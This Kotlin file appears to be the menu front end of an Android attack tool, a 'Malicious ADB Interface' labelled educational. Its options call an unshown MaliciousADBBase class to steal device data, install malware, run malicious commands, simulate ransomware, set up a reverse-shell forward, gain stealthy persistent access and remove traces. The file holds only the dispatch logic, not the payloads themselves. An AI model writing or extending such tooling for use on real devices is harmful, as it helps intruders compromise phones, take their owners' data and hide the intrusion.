package Src

import Src.ADB.MaliciousADBBase

fun main() {
    val adb = MaliciousADBBase()

    println("--- Malicious ADB Interface (Educational Purposes Only) ---")
    println("Available actions:")
    println("1. Prepare Attack (Enable stealth, persistent access, track IP)")
    println("2. Steal All Data (to /sdcard/stolen_data)")
    println("3. Dump System Info (to /sdcard/system_info)")
    println("4. Simulate Ransomware")
    println("5. Install Malware (requires path to APK)")
    println("6. Execute Malicious Command (requires command)")
    println("7. List Files (/sdcard)")
    println("8. Pull File (requires device path and local path)")
    println("9. Push File (requires local path and device path)")
    println("10. Install APK (requires path to APK)")
    println("11. Uninstall App (requires package name)")
    println("12. Clear App Data (requires package name)")
    println("13. Reboot Device")
    println("14. Take Screenshot (to screenshot.png)")
    println("15. Get Device Model")
    println("16. Get Device Serial Number")
    println("17. Get Android Version")
    println("18. Read Logcat")
    println("19. Check Root Status")
    println("20. Check ADB Accessibility")
    println("21. Setup Reverse Shell Forward (requires local port)")
    println("22. Attempt Cleanup (requires package name or path)")
    println("0. Exit")

    while (true) {
        print("Enter action number: ")
        val choice = readLine()?.toIntOrNull()

        when (choice) {
            1 -> adb.prepareAttack()
            2 -> {
                val destination = "/sdcard/stolen_data"
                println("Stealing all accessible data to: $destination")
                adb.stealAllData(destination)
            }
            3 -> {
                val destination = "/sdcard/system_info"
                println("Dumping system information to: $destination")
                adb.dumpSystemInfo(destination)
            }
            4 -> adb.simulateRansomware()
            5 -> {
                print("Enter path to APK: ")
                val apkPath = readLine()
                apkPath?.let { adb.installMalware(it) } ?: println("APK path cannot be empty.")
            }
            6 -> {
                print("Enter command to execute: ")
                val command = readLine()
                command?.let { adb.executeMaliciousCommand(it) } ?: println("Command cannot be empty.")
            }
            7 -> println(adb.listFiles())
            8 -> {
                print("Enter device path: ")
                val devicePath = readLine()
                print("Enter local path: ")
                val localPath = readLine()
                if (!devicePath.isNullOrBlank() && !localPath.isNullOrBlank()) {
                    adb.pullFile(devicePath, localPath)
                } else {
                    println("Device path and local path cannot be empty.")
                }
            }
            9 -> {
                print("Enter local path: ")
                val localPath = readLine()
                print("Enter device path: ")
                val devicePath = readLine()
                if (!localPath.isNullOrBlank() && !devicePath.isNullOrBlank()) {
                    adb.pushFile(localPath, devicePath)
                } else {
                    println("Local path and device path cannot be empty.")
                }
            }
            10 -> {
                print("Enter path to APK: ")
                val apkPath = readLine()
                apkPath?.let { adb.installApk(it) } ?: println("APK path cannot be empty.")
            }
            11 -> {
                print("Enter package name to uninstall: ")
                val packageName = readLine()
                packageName?.let { adb.uninstallApp(it) } ?: println("Package name cannot be empty.")
            }
            12 -> {
                print("Enter package name to clear data: ")
                val packageName = readLine()
                packageName?.let { adb.clearAppData(it) } ?: println("Package name cannot be empty.")
            }
            13 -> adb.rebootDevice()
            14 -> adb.takeScreenshot()
            15 -> println("Device Model: ${adb.getDeviceModel()}")
            16 -> println("Device Serial Number: ${adb.getDeviceSerialNumber()}")
            17 -> println("Android Version: ${adb.getAndroidVersion()}")
            18 -> println(adb.readLogcat())
            19 -> println("Is Device Rooted: ${adb.isDeviceRooted()}")
            20 -> println("Is ADB Accessible: ${adb.isAdbAccessible()}")
            21 -> {
                print("Enter local port to forward: ")
                val localPort = readLine()?.toIntOrNull()
                localPort?.let { adb.setupReverseShellForward(it) } ?: println("Invalid port number.")
            }
            22 -> {
                print("Enter package name or path to cleanup: ")
                val target = readLine()
                target?.let {
                    adb.attemptCleanup(it)
                    adb.attemptFileRemoval(it)
                } ?: println("Target cannot be empty.")
            }
            0 -> break
            else -> println("Invalid action. Please try again.")
        }
        println()
    }

    adb.cleanup()
    println("Exiting.")
}
